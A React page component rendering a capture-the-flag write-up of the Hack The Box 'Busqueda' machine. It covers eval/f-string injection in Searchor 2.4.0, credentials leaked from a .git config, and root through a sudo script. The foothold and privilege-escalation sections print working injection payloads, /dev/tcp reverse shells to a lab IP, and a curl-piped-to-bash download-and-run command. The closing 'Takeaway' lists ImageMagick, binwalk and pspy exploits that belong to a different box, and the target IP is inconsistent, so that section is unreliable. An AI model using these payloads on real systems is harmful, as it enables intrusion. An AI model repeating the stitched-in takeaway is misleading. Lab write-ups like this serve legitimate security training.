import React from 'react';

// Import placeholder images - replace with actual screenshots
import busquedaLogo from "../../assets/busqueda/logo.png"
import hdbBanner from "../../assets/cyber/hdb.png"

import nmapScan from "../../assets/busqueda/nmap-scan.png"
import searchorVuln from "../../assets/busqueda/vuln.png"
import burpRequest from "../../assets/busqueda/post.png"
import ffufScan from "../../assets/busqueda/size.png"
import payloadTest from "../../assets/busqueda/payload-test.png"
import payloadWorking from "../../assets/busqueda/payload-working.png"
import rcePayload from "../../assets/busqueda/post-payload.png"
import reverseShell from "../../assets/busqueda/svc.png"
import gitConfig from "../../assets/busqueda/config.png"
import giteaLogin from "../../assets/busqueda/cat-conf.png"
import etcPasswd from "../../assets/busqueda/etc-passwd.png"
import sudoL from "../../assets/busqueda/sudo-l.png"
import dockerPs from "../../assets/busqueda/docker-ps.png"
import mysqlCreds from "../../assets/busqueda/inspected.png"
import dockerDocs from "../../assets/busqueda/docker1.png"
import dockerDocs2 from "../../assets/busqueda/docker2.png"
import sourceCode from "../../assets/busqueda/gittea.png"
import rootShell from "../../assets/busqueda/root.png"

const Busqueda = () => {
    const scrollToSection = (sectionId) => {
        const element = document.getElementById(sectionId);
        if (element) {
            element.scrollIntoView({ behavior: 'smooth', block: 'start' });
        }
    };

    return(
        <div className="w-[100%] bg p-10 flex flex-col justify-center items-center">
                
            <div className="w-[80%] relative bg border-[3px] p-10 flex flex-col items-center rounded bg-[rgba(255,255,255,0.1)]">
                <div className="absolute border right-0 top-0" style={{borderBottomLeftRadius:10}}>
                    <h3 className="text-white p-2 text-[5px] md:text-[12px] md:p-3">Created at: <span className="opacity-80">7/20/2025</span></h3>
                </div>
                <h2 className="text-white text-[30px] md:text-[50px]">Busqueda</h2>
                <h2 className="text-white text-[10px] opacity-80 font-thin text-center md:text-[20px]">Welcome to Busqueda, a fascinating challenge that demonstrates the dangers of Python eval() and f-string injection vulnerabilities. Explore how improper input sanitization in a Flask application leads to remote code execution, discover exposed git repositories containing sensitive credentials, and learn how Docker configuration mismanagement enables privilege escalation. This box showcases the critical importance of secure coding practices!</h2>
                
                <div className="flex flex-wrap justify-center gap-2 mt-4">
                    {["Python eval injection", "f-string escape", "CVE-2023-43364", "git credential leak", "Docker privilege escalation", "Searchor 2.4.0", "Flask exploitation", "sudo misconfiguration"].map((tag, index) => (
                        <span key={index} className="bg-[rgba(255,255,255,0.2)] text-white px-3 py-1 rounded-full text-xs md:text-sm border border-white/30">
                            {tag}
                        </span>
                    ))}
                </div>
            </div>
            
            
            <div className="w-[80%] bg  p-10 flex flex-col items-center rounded ">
                <img className="relative w-[80%]  border-[2px]" src={busquedaLogo} alt="busqueda landing page" />
                <img className="relative w-[80%] border-[2px]" src={hdbBanner} alt="htb banner" />
            </div>

            
              <div className="relative align-center left-0 right-0 z-50 opacity-100  w-[60%] rounded  backdrop-blur-md border-bold md:mb-[-55px]">
                <div className="max-w-6xl mx-auto px-4 py-3">
                    <div className="flex items-center justify-between">
                        <div className="text-white font-semibold text-lg">
                            Busqueda HTB
                        </div>
                        <nav className="hidden md:flex items-center space-x-6 md:px-10">
                            <button 
                                onClick={() => scrollToSection('overview')}
                                className="text-white/80 hover:text-white transition-colors duration-200 text-sm font-medium hover:bg-white/10 px-3 py-1 rounded"
                            >
                                Overview
                            </button>
                            <button 
                                onClick={() => scrollToSection('enumeration')}
                                className="text-white/80 hover:text-white transition-colors duration-200 text-sm font-medium hover:bg-white/10 px-3 py-1 rounded"
                            >
                                Enumeration
                            </button>
                            <button 
                                onClick={() => scrollToSection('foothold')}
                                className="text-white/80 hover:text-white transition-colors duration-200 text-sm font-medium hover:bg-white/10 px-3 py-1 rounded"
                            >
                                Foothold
                            </button>
                            <button 
                                onClick={() => scrollToSection('privilege-escalation')}
                                className="text-white/80 hover:text-white transition-colors duration-200 text-sm font-medium hover:bg-white/10 px-3 py-1 rounded"
                            >
                                Privesc
                            </button>
                            <button 
                                onClick={() => scrollToSection('takeaway')}
                                className="text-white/80 hover:text-white transition-colors duration-200 text-sm font-medium hover:bg-white/10 px-3 py-1 rounded"
                            >
                                Takeaway
                            </button>
                        </nav>
                        
                        {/* Mobile Menu Button */}
                        <div className="md:hidden">
                            <button 
                                id="mobile-menu-btn"
                                onClick={() => {
                                    const menu = document.getElementById('mobile-menu');
                                    menu.classList.toggle('hidden');
                                }}
                                className="text-white hover:bg-white/10 p-2 rounded"
                            >
                                <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 6h16M4 12h16M4 18h16" />
                                </svg>
                            </button>
                        </div>
                    </div>
                    
                    {/* Mobile Menu */}
                    <div id="mobile-menu" className="hidden md:hidden mt-3 pb-3 border-t border-white/10 pt-3">
                        <div className="flex flex-col space-y-2">
                            <button 
                                onClick={() => {
                                    scrollToSection('overview');
                                    document.getElementById('mobile-menu').classList.add('hidden');
                                }}
                                className="text-white/80 hover:text-white transition-colors duration-200 text-sm font-medium hover:bg-white/10 px-3 py-2 rounded text-left"
                            >
                                Overview
                            </button>
                            <button 
                                onClick={() => {
                                    scrollToSection('enumeration');
                                    document.getElementById('mobile-menu').classList.add('hidden');
                                }}
                                className="text-white/80 hover:text-white transition-colors duration-200 text-sm font-medium hover:bg-white/10 px-3 py-2 rounded text-left"
                            >
                                Enumeration
                            </button>
                            <button 
                                onClick={() => {
                                    scrollToSection('foothold');
                                    document.getElementById('mobile-menu').classList.add('hidden');
                                }}
                                className="text-white/80 hover:text-white transition-colors duration-200 text-sm font-medium hover:bg-white/10 px-3 py-2 rounded text-left"
                            >
                                Foothold
                            </button>
                            <button 
                                onClick={() => {
                                    scrollToSection('privilege-escalation');
                                    document.getElementById('mobile-menu').classList.add('hidden');
                                }}
                                className="text-white/80 hover:text-white transition-colors duration-200 text-sm font-medium hover:bg-white/10 px-3 py-2 rounded text-left"
                            >
                                Privesc
                            </button>
                            <button 
                                onClick={() => {
                                    scrollToSection('takeaway');
                                    document.getElementById('mobile-menu').classList.add('hidden');
                                }}
                                className="text-white/80 hover:text-white transition-colors duration-200 text-sm font-medium hover:bg-white/10 px-3 py-2 rounded text-left"
                            >
                                Takeaway
                            </button>
                        </div>
                    </div>
                </div>
                </div>
          

            <div className="h-1 border w-[100%] bg-white rounded opacity-90 mt-10" />

            <div id="enumeration" className="w-[100%] flex flex-col items-center mt-20">
                <h1 className="text-white text-[25px] font-medium md:text-[40px]">Enumeration</h1>
                
                <div className="w-[80%] mt-8 text-white md:mt-[80px]">
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Let's start with an <span className="text-yellow-400">nmap</span> scan to see open ports
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            export RHOST=10.10.11.208
                        </code>
                    </div>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            sudo nmap $RHOST -p- -sVC -oN nmap/tcp.txt
                        </code>
                    </div>
                    
                    <img className="w-full border-[2px] relative border-white/30 rounded mb-6" src={nmapScan} alt="nmap scan results" />
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        We see that it's hosting a webapp with the domain of <span className="text-blue-400">searcher.htb</span>. Let's put it into the <span className="text-yellow-400">/etc/hosts</span> file for DNS resolution and visit the website
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            sudo sh -c 'echo "10.10.11.239 searcher.htb" >> /etc/hosts'
                        </code>
                    </div>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            firefox http://searcher.htb
                        </code>
                    </div>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Upon visiting the website we see a lot of interesting things:
                    </p>
                    
                    <ul className="list-disc list-inside mb-6 opacity-90">
                        <li className="mb-2">It's a <span className="text-yellow-400">Flask server</span></li>
                        <li className="mb-2">This Flask server uses <span className="text-red-400 font-semibold">Searchor 2.4.0</span></li>
                    </ul>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        We can also observe what the <span className="text-blue-400">searchor</span> main purpose is. We can select the engine and what we want to search for and it would make a query on that specific engine
                    </p>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        The next step I did is to search for any vulnerabilities on 2.4.0. And I found what I have been looking for which is <span className="text-red-400 font-semibold">CVE-2023-43364</span>
                    </p>
                    
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={searchorVuln} alt="CVE-2023-43364 vulnerability" />
                </div>
            </div>

            <div className="h-1 border w-[100%] bg-white rounded opacity-90 mt-10" />

            <div id="foothold" className="w-[100%] flex flex-col items-center mt-10">
                <h1 className="text-white text-[25px] font-medium md:text-[40px] md:mb-5">Foothold</h1>
                
                <div className="w-[80%] mt-8 text-white">
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        We can see that the parameters <span className="text-yellow-400">engine</span> and <span className="text-yellow-400">query</span> that we can control from the website are taken into an f string and then its executed with <span className="text-red-400">eval()</span>. So If we could escape the f string and include a python command injection we could execute it with <span className="text-red-400">eval()</span>. Lets see how our parameters handled with <span className="text-blue-400">burp</span> and how we could escape and execute with eval.
                    </p>
                    
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={burpRequest} alt="burp request" />
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Now before trying to escape the f string I want to know if there are blacklisted characters and to know which characters we have in our toolbox to escape
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            nano req.txt
                        </code>
                    </div>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6 overflow-x-auto">
                        <pre className="text-green-400 text-xs md:text-sm">
{`POST /search HTTP/1.1
Host: searcher.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 102
Origin: http://searcher.htb
Connection: keep-alive
Referer: http://searcher.htb/search
Upgrade-Insecure-Requests: 1
Priority: u=0, i

engine=Accuweather&query=FUZZ`}
                        </pre>
                    </div>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6 overflow-x-auto">
                        <code className="text-green-400 text-sm">
                            ffuf -request req.txt -request-proto http -w /usr/share/wordlists/Web/SpecialChars/special
                        </code>
                    </div>
                    
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={ffufScan} alt="ffuf scan results" />
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        After analising the response in <span className="text-blue-400">burp</span> I can conclude that:
                    </p>
                    
                    <ul className="list-disc list-inside mb-6 opacity-90">
                        <li className="mb-2">Unfiltered: <span className="text-yellow-400">\</span> and <span className="text-yellow-400">'</span></li>
                        <li className="mb-2">Any other is filtered but can be bypassed with <span className="text-red-400">URL encoding</span></li>
                    </ul>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Now with this information we can move on to injection. First I could escape the <span className="text-yellow-400">.search()</span> by:
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            engine=Accuweather&query=hey')%2b'1'%23
                        </code>
                    </div>
                    
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={payloadTest} alt="payload test" />
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        and adding a string to it to test out weather it worked with <span className="text-yellow-400">+</span> url encoded <span className="text-red-400">%2b</span>
                    </p>
                    
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={payloadWorking} alt="payload working" />
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        And It did !! Now instead of just adding '1' we can import os and run <span className="text-red-400 font-semibold">RCE</span>
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6 overflow-x-auto">
                        <code className="text-green-400 text-sm">
                            engine=Accuweather&query=hey')%2b__import__('os').system('whoami')%23
                        </code>
                    </div>
                    
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={rcePayload} alt="RCE payload" />
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Now lets make a reverse shell by hosting a reverse shell bash script and running it with curl by RCE
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6 overflow-x-auto">
                        <pre className="text-green-400 text-xs md:text-sm">
{`echo '#!/bin/bash
0<&196;exec 196<>/dev/tcp/10.10.14.11/9443; bash <&196 >&196 2>&196' > bash_1.sh`}
                        </pre>
                    </div>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            python3 -m http.server 80
                        </code>
                    </div>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6 overflow-x-auto">
                        <code className="text-green-400 text-sm">
                            engine=Accuweather&query=hey')%2b__import__('os').system('curl+http://10.10.14.11/bash_1.sh|bash')%23
                        </code>
                    </div>
                    
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={reverseShell} alt="reverse shell" />
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        And we got <span className="text-green-400 font-semibold">Foothold !!</span>
                    </p>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Lets upgrade and move further
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6 overflow-x-auto">
                        <pre className="text-green-400 text-xs md:text-sm">
{`# In your reverse shell:
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Press Ctrl+Z to background the shell
# On your attacking machine (Kali):
stty raw -echo; fg

# Press Enter twice
# Back in the reverse shell:
export TERM=xterm-256color
export SHELL=/bin/bash
stty rows 24 columns 80`}
                        </pre>
                    </div>
                </div>
            </div>

            <div className="h-1 border w-[100%] bg-white rounded opacity-90 mt-10" />

            <div id="privilege-escalation" className="w-[100%] flex flex-col items-center mt-10">
                <h1 className="text-white text-[30px] font-medium md:text-[40px]">Privilege Escalation</h1>
                
                <div className="w-[80%] mt-8 text-white">
                    <h2 className="text-xl md:text-2xl mb-6 text-yellow-400">Privilege Escalation - P1</h2>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Running <span className="text-yellow-400">ls -la</span> in the folder we got dropped into <span className="text-blue-400">/var/www/app</span> we can see a <span className="text-red-400">.git</span> folder
                    </p>
                    
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={gitConfig} alt="git config" />
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Enumerating the files we can see something juicy inside the config file
                    </p>

                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={giteaLogin} alt="gitea login" />
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            cody:jh1usoih2bkjaspwe92
                        </code>
                    </div>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        We see credentials for a <span className="text-yellow-400">gitea</span> under the subdomain <span className="text-blue-400">gitea.searcher.htb</span> for the user cody. Lets put this domain into our etc hosts
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            sudo nano /etc/hosts
                        </code>
                    </div>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            10.10.11.208    searcher.htb    gitea.searcher.htb
                        </code>
                    </div>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        And then upon visiting it we can login with the found credentials
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            firefox http://gitea.searcher.htb
                        </code>
                    </div>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Enumerating the gitea all I could find that there is another user <span className="text-yellow-400">administrator</span>, but nothing more. So my next idea was to ssh into the target with the credentials we found. First checking if there is a user called <span className="text-blue-400">cody</span>
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            cat /etc/passwd
                        </code>
                    </div>
                    
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={etcPasswd} alt="etc passwd" />
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        I couldn't find any <span className="text-yellow-400">cody</span> and the only user that can be ssh into with shell is <span className="text-blue-400">svc</span> which is the same user we are already in but the shell we are in is limited and asks for password for crucial enumeration actions like <span className="text-red-400">sudo</span> so I tried logging in
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            svc:jh1usoih2bkjaspwe92
                        </code>
                    </div>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            ssh svc@10.10.11.208
                        </code>
                    </div>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        And we get in !!
                    </p>
                    
                    <h2 className="text-xl md:text-2xl mb-6 mt-10 text-yellow-400">Privilege Escalation - P2</h2>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Now running <span className="text-yellow-400">sudo -l</span> we can see we are able to run a system-checkup python file as root
                    </p>
                    
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={sudoL} alt="sudo -l output" />
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Now I tried looking into its purpose to detect a vector for escalating to root
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6 overflow-x-auto">
                        <pre className="text-green-400 text-xs md:text-sm">
{`svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py *
Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)

     docker-ps      : List running docker containers
     docker-inspect : Inspect a certain docker container
     full-checkup   : Run a full system checkup`}
                        </pre>
                    </div>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Testing out each usecase I could see that it must execute the official docker binary as it worked exactly like docker does. And googling the docker-inspect and how it works we can see that it could leak us useful information
                    </p>
                    
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={dockerDocs} alt="docker docs" />
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        "Docker inspect provides detailed information on constructs controlled by Docker."
                    </p>

                     <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={dockerDocs2} alt="docker docs" />
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        So based on this lets request information in JSON format from the running services inspected by the <span className="text-yellow-400">docker ps</span>
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps
                        </code>
                    </div>
                    
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={dockerPs} alt="docker ps output" />
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6 overflow-x-auto">
                        <code className="text-green-400 text-sm">
                            sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect {"{{json .}}"} mysql_db'
                        </code>
                    </div>
                    
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={mysqlCreds} alt="mysql credentials" />
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            gitea:yuiu1hoiu4i5ho1uh
                        </code>
                    </div>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        I tried accessing the mysql from the terminal with these credentials but I didn't work. So my next idea was to log into the gitea as <span className="text-yellow-400">Administrator</span>. And It worked !!
                    </p>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        From here I we can see the source code of the file / files we can run as root
                    </p>
                    
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={sourceCode} alt="source code" />
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        Here I could identify a common mistake that explains why when I firstly tried running <span className="text-yellow-400">Full Checkup</span> it returned "something went wrong". It said this because the file was not in the current working directory as with <span className="text-red-400">./</span> it looks into the working directory I'm in when running the file. So If i create this <span className="text-blue-400">.sh</span> file it would be executed as root !!
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            cd /home/svc
                        </code>
                    </div>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6 overflow-x-auto">
                        <pre className="text-green-400 text-xs md:text-sm">
{`echo '#!/bin/bash
0<&196;exec 196<>/dev/tcp/10.10.14.11/8443; bash <&196 >&196 2>&196' > full-checkup.sh`}
                        </pre>
                    </div>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            chmod +x full-checkup.sh
                        </code>
                    </div>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            nc -lvnp 8443
                        </code>
                    </div>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        And Now lets run the file with sudo
                    </p>
                    
                    <div className="bg-[rgba(0,0,0,0.3)] p-4 rounded border border-white/20 mb-6">
                        <code className="text-green-400 text-sm">
                            sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
                        </code>
                    </div>
                    
                    <p className="text-sm md:text-base mb-6 opacity-90">
                        And we got a <span className="text-red-400 font-semibold">root shell !!</span>
                    </p>
                    
                    <img className="w-full relative border-[2px] border-white/30 rounded mb-6" src={rootShell} alt="root shell" />
                </div>
            </div>

            <div className="h-1 border w-[100%] bg-white rounded opacity-90 mt-10" />

            <div id="takeaway" className="w-[100%] flex flex-col items-center mt-10">
                <h1 className="text-white text-[20px] font-medium md:text-[30px]">Takeaway</h1>
                
                <div className="w-[80%] mt-8 text-white">
                    <div className="bg-[rgba(255,255,255,0.1)] p-6 rounded border border-white/30">
                        <h3 className="text-lg mb-4 text-yellow-400">Key Learning Points:</h3>
                        <ul className="space-y-2 text-sm md:text-base opacity-90">
                            <li>• <span className="text-red-400">Git Repository Exposure:</span> Exposed .git directories can leak critical source code, revealing database locations and application logic</li>
                            <li>• <span className="text-blue-400">ImageMagick Vulnerabilities:</span> CVE-2022-44268 allows arbitrary file reads through malicious PNG files, enabling sensitive data extraction</li>
                            <li>• <span className="text-yellow-400">Version Enumeration:</span> Always check versions of installed software - outdated binaries often contain exploitable vulnerabilities</li>
                            <li>• <span className="text-green-400">Process Monitoring:</span> Tools like pspy reveal background processes and scheduled tasks that may run with elevated privileges</li>
                            <li>• <span className="text-purple-400">Chained Exploits:</span> Combining multiple vulnerabilities (file read + RCE) can lead to complete system compromise</li>
                            <li>• <span className="text-orange-400">Binwalk Exploitation:</span> CVE-2022-4510 demonstrates how file analysis tools can be weaponized for remote code execution</li>
                            <li>• <span className="text-cyan-400">Automated Scanning:</span> Background malware scanners can be exploited by placing malicious files in monitored directories</li>
                        </ul>
                        
                        <h3 className="text-lg mt-6 mb-4 text-yellow-400">Tools Mastered:</h3>
                        <div className="grid grid-cols-2 md:grid-cols-4 gap-4 text-sm">
                            <div className="bg-[rgba(0,0,0,0.3)] p-3 rounded border border-white/20 text-center">
                                <span className="text-green-400">nmap</span>
                            </div>
                            <div className="bg-[rgba(0,0,0,0.3)] p-3 rounded border border-white/20 text-center">
                                <span className="text-red-400">ffuf</span>
                            </div>
                            <div className="bg-[rgba(0,0,0,0.3)] p-3 rounded border border-white/20 text-center">
                                <span className="text-blue-400">git-dumper</span>
                            </div>
                            <div className="bg-[rgba(0,0,0,0.3)] p-3 rounded border border-white/20 text-center">
                                <span className="text-yellow-400">ImageMagick</span>
                            </div>
                            <div className="bg-[rgba(0,0,0,0.3)] p-3 rounded border border-white/20 text-center">
                                <span className="text-purple-400">pspy</span>
                            </div>
                            <div className="bg-[rgba(0,0,0,0.3)] p-3 rounded border border-white/20 text-center">
                                <span className="text-orange-400">binwalk</span>
                            </div>
                            <div className="bg-[rgba(0,0,0,0.3)] p-3 rounded border border-white/20 text-center">
                                <span className="text-cyan-400">xxd</span>
                            </div>
                            <div className="bg-[rgba(0,0,0,0.3)] p-3 rounded border border-white/20 text-center">
                                <span className="text-pink-400">identify</span>
                            </div>
                        </div>
                        
                        <div className="mt-6 p-4 bg-[rgba(255,0,0,0.1)] border border-red-400/50 rounded">
                            <p className="text-red-300 text-sm">
                                <strong>Security Insight:</strong> This box demonstrates the critical importance of proper source code management and version control. 
                                The exposed .git repository provided a roadmap for exploitation, while outdated software versions created multiple attack vectors. 
                                The combination of information disclosure through file read vulnerabilities and privilege escalation through automated processes 
                                shows how attackers can chain seemingly minor issues into complete system compromise.
                            </p>
                        </div>
                        
                        <div className="mt-4 p-4 bg-[rgba(0,255,0,0.1)] border border-green-400/50 rounded">
                            <p className="text-green-300 text-sm">
                                <strong>Defensive Recommendations:</strong> Ensure .git directories are never exposed in production environments, 
                                regularly update all software components especially image processing libraries, implement proper access controls for 
                                automated scanning processes, and monitor for unusual file uploads or modifications in sensitive directories.
                            </p>
                        </div>
                    </div>
                </div>
            </div>
            
            <div className="h-1 border w-[100%] bg-white rounded opacity-90 mt-10" />
            
       
        </div>
    )
}

export default Busqueda;